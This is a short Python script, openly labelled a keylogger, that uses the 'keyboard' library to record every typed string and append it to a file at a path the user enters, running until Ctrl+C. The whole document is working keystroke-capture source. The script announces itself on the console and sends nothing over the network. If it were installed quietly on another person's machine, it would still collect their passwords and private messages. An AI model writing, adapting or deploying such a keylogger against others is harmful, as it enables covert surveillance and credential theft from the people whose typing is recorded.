
import keyboard  # for capturing keystrokes
# https://github.com/boppreh/keyboard?tab=readme-ov-file#api


def log_keys():
    path = input("Write full path to where you want to save: ").strip()

    with open(path, 'a') as keys_captured:
        print("keylogger started. Press Ctrl+C to stop...")
        try:
            while True:
                event = list(keyboard.get_typed_strings(
                    keyboard.record(until='space')))
                if event:
                    for text in event:
                        keys_captured.write(text + '\n')
        except KeyboardInterrupt:
            print('exited via Ctrl+C')


if __name__ == "__main__":
    log_keys()
